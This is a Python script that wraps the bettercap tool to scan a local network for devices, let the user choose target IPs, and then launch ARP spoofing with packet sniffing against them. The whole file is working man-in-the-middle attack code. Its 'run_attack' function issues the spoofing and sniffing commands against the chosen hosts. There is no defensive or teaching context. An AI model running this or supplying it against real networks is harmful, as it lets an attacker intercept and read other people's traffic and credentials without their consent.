import subprocess
import sys
import time
import threading
import re

# Add this function to strip ANSI escape codes from each line!
def strip_ansi_codes(text):
    ansi_escape = re.compile(r'\x1b\[[0-9;]*[mK]')
    return ansi_escape.sub('', text)

def start_bettercap(iface):
    print(f"[*] Starting bettercap on interface {iface}...")
    try:
        proc = subprocess.Popen(
            ["sudo", "bettercap", "-iface", iface],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        time.sleep(2)
        return proc
    except FileNotFoundError:
        print("[!] Error: 'bettercap' command not found. Make sure it's installed and in your PATH.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] An error occurred while starting bettercap: {e}")
        sys.exit(1)

def parse_devices_log(output_lines):
    # Strip ansi codes before regex!
    device_re = re.compile(
        r"\[endpoint\.new\] endpoint\s+([0-9a-fA-F\.:]+)(?: \((.*?)\))?\s+detected as\s+([0-9a-fA-F:]{11,})(?: \((.*?)\))?"
    )
    devices = []
    seen = set()
    for line in output_lines:
        line = strip_ansi_codes(line)
        m = device_re.search(line)
        if m:
            ip, name, mac, vendor = m.groups()
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
                key = (ip, mac)
                if key not in seen:
                    devices.append({
                        "ip": ip,
                        "mac": mac,
                        "name": name if name else "N/A",
                        "vendor": vendor if vendor else "N/A"
                    })
                    seen.add(key)
    return devices

def parse_devices_table(output_lines):
    devices = []
    in_table = False
    for line in output_lines:
        line = strip_ansi_codes(line)
        if line.strip().startswith("┌") and "IP" in line and "MAC" in line:
            in_table = True
            continue
        if in_table and line.strip().startswith("└"):
            in_table = False
            continue
        if in_table and line.strip().startswith("│"):
            # skip header
            if "IP" in line and "MAC" in line: continue
            # must be an actual row
            parts = [p.strip() for p in line.strip("│\n\r ").split("│")]
            if len(parts) < 4: continue
            ip, mac, name, vendor = parts[0], parts[1], parts[2], parts[3]
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) and re.match(r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", mac):
                devices.append({
                    "ip": ip,
                    "mac": mac,
                    "name": name or "N/A",
                    "vendor": vendor or "N/A"
                })
    return devices

def discover_devices(proc):
    output_lines = []
    stop_reading = threading.Event()

    def read_output():
        while not stop_reading.is_set():
            line = proc.stdout.readline()
            if not line:
                break
            print(line, end='')  # print live
            output_lines.append(line)
    t = threading.Thread(target=read_output, daemon=True)
    t.start()
    try:
        proc.stdin.write("net.probe on\n")
        proc.stdin.flush()
        print("[*] Device discovery started. Let it run for a bit to find devices...")
        input("[*] Press Enter when you are ready to see the list of discovered devices...\n")
        proc.stdin.write("net.probe off\n")
        proc.stdin.flush()
        time.sleep(1)
        proc.stdin.write("net.show\n")
        proc.stdin.flush()
        time.sleep(5)
    finally:
        stop_reading.set()
        t.join(timeout=3)

    print("\n--- Parsing Discovered Devices ---")

    # PRINT ALL RAW LINES FOR DEBUGGING!
    print("--- RAW OUTPUT LINES (DEBUGGING) ---")
    for line in output_lines:
        print(repr(line))
    print("--- END RAW OUTPUT LINES (DEBUGGING) ---")

    devices = {}
    for dev in parse_devices_log(output_lines):
        devices[(dev['ip'], dev['mac'])] = dev
    for dev in parse_devices_table(output_lines):
        devices[(dev['ip'], dev['mac'])] = dev
    discovered = list(devices.values())
    if not discovered:
        print("[!] No devices were found. Exiting.")
        proc.terminate()
        sys.exit(1)
    return discovered

def get_user_choices(devices):
    print("\n[+] Discovered Devices:")
    for i, device in enumerate(devices):
        print(f"  [{i}] IP: {device['ip']:<15} MAC: {device['mac']:<17} Name: {device['name']}")
    while True:
        try:
            target_indices_str = input("\n[*] Enter the number(s) of the target(s) (e.g., 0 or 1,3): ")
            target_indices = [int(i.strip()) for i in target_indices_str.split(',') if i.strip().isdigit()]
            if not target_indices:
                raise ValueError
            if all(0 <= index < len(devices) for index in target_indices):
                selected_ips = [devices[i]['ip'] for i in target_indices]
                targets_str = ",".join(selected_ips)
                break
            else:
                print("[!] Invalid selection. Please enter number(s) from the list above.")
        except ValueError:
            print("[!] Invalid input. Please enter numbers only.")
    while True:
        choice = input("[*] Enable full-duplex ARP spoofing? (y/n): ").strip().lower()
        if choice in ['y', 'yes']:
            fullduplex = "true"
            break
        elif choice in ['n', 'no']:
            fullduplex = "false"
            break
        else:
            print("[!] Invalid choice. Please enter 'y' or 'n'.")
    return targets_str, fullduplex

def run_attack(proc, targets, fullduplex):
    command = f"set arp.spoof.fullduplex {fullduplex}; set arp.spoof.targets {targets}; arp.spoof on; net.sniff on"
    print(f"\n[+] Executing command: {command}")
    proc.stdin.write(command + "\n")
    proc.stdin.flush()
    print("\n[***] ARP spoofing and sniffing started! Press Ctrl+C to exit. [***]")
    try:
        while True:
            line = proc.stdout.readline()
            if not line:
                break
            print(line, end="")
    except KeyboardInterrupt:
        print("\n[*] Stopping bettercap and exiting...")
        proc.terminate()
    except Exception as e:
        print(f"\n[!] An error occurred: {e}")
        proc.terminate()

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <network_interface>")
        sys.exit(1)
    iface = sys.argv[1]
    proc = start_bettercap(iface)
    if not proc:
        print("[!] Failed to start bettercap. Exiting.")
        sys.exit(1)
    devices = discover_devices(proc)
    if not devices:
        print("[!] No devices found. Exiting.")
        proc.terminate()
        sys.exit(1)
    targets, fullduplex = get_user_choices(devices)
    run_attack(proc, targets, fullduplex)

if __name__ == "__main__":
    main()
